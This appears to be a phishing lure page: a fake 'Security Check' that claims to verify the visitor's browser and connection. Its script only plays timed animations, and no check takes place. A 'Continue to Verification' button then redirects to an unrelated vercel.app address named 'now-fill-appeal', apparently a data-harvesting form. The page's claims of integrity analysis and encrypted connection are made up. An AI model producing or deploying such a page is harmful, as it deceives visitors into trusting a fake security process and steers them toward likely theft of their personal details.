<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Identity Verification</title>
    <style>
        :root {
            --primary: #2563eb;
            --primary-hover: #1d4ed8;
            --bg: #f8fafc;
            --card-bg: #ffffff;
            --text-main: #1e293b;
            --text-muted: #64748b;
            --border: #e2e8f0;
            --success: #10b981;
        }

        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg);
            color: var(--text-main);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            -webkit-font-smoothing: antialiased;
        }

        .card {
            width: 100%;
            max-width: 400px;
            background: var(--card-bg);
            border-radius: 16px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            padding: 40px;
            text-align: center;
            border: 1px solid var(--border);
            box-sizing: border-box;
        }

        /* Abstract Shield Icon */
        .icon-container {
            width: 64px;
            height: 64px;
            background: #eff6ff;
            color: var(--primary);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
        }

        h1 {
            font-size: 1.5rem;
            font-weight: 700;
            margin: 0 0 8px;
            letter-spacing: -0.025em;
        }

        p {
            color: var(--text-muted);
            font-size: 0.95rem;
            margin-bottom: 32px;
            line-height: 1.5;
        }

        /* Verification Steps */
        .status-list {
            text-align: left;
            margin-bottom: 32px;
        }

        .step {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 12px;
            font-size: 0.9rem;
            color: var(--text-muted);
            opacity: 0.4;
            transition: all 0.4s ease;
        }

        .step.active {
            opacity: 1;
            color: var(--text-main);
        }

        .step.complete {
            opacity: 1;
            color: var(--success);
        }

        .dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: var(--border);
        }

        .complete .dot {
            background: var(--success);
        }

        /* Spinner */
        .loader {
            width: 20px;
            height: 20px;
            border: 2px solid var(--border);
            border-top: 2px solid var(--primary);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            display: inline-block;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Button Styling */
        button {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 8px;
            background: var(--primary);
            color: white;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s ease, opacity 0.5s ease, transform 0.2s ease;
            opacity: 0;
            pointer-events: none;
            display: block;
        }

        button.visible {
            opacity: 1;
            pointer-events: auto;
        }

        button:hover {
            background: var(--primary-hover);
            transform: translateY(-1px);
        }

        button:active {
            transform: translateY(0);
        }

        .footer {
            margin-top: 24px;
            font-size: 0.8rem;
            color: var(--text-muted);
        }
    </style>
</head>
<body>

<div class="card">
    <div class="icon-container">
        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
    </div>

    <h1>Security Check</h1>
    <p>Please wait while we verify your browser and connection security.</p>

    <div class="status-list">
        <div id="step-1" class="step"><div class="dot"></div> Initializing secure environment...</div>
        <div id="step-2" class="step"><div class="dot"></div> Analyzing browser integrity...</div>
        <div id="step-3" class="step"><div class="dot"></div> Finalizing encrypted connection...</div>
    </div>

    <div id="loading-area" style="height: 40px; margin-bottom: 10px;">
        <div class="loader"></div>
    </div>

    <button id="next-btn" onclick="handleContinue()">Continue to Verification</button>

    <div class="footer">
        &copy; 2026 SecureGate Systems. All rights reserved.
    </div>
</div>

<script>
    const steps = ["step-1", "step-2", "step-3"];
    let currentStep = 0;

    function processSteps() {
        if (currentStep < steps.length) {
            const el = document.getElementById(steps[currentStep]);
            el.classList.add('active');
            
            // Simulate completion of previous step
            if(currentStep > 0) {
                document.getElementById(steps[currentStep-1]).classList.add('complete');
            }

            currentStep++;
            setTimeout(processSteps, 1000);
        } else {
            // Mark last step complete
            document.getElementById(steps[steps.length - 1]).classList.add('complete');
            
            // Show button and hide loader
            document.getElementById("loading-area").style.display = "none";
            const btn = document.getElementById("next-btn");
            btn.classList.add("visible");
        }
    }

    // Start logic
    window.onload = () => {
        setTimeout(processSteps, 500);
    };

    function handleContinue() {
        // Professional redirect behavior
        window.location.href = "https://now-fill-appeal.vercel.app/";
    }
</script>

</body>
</html>
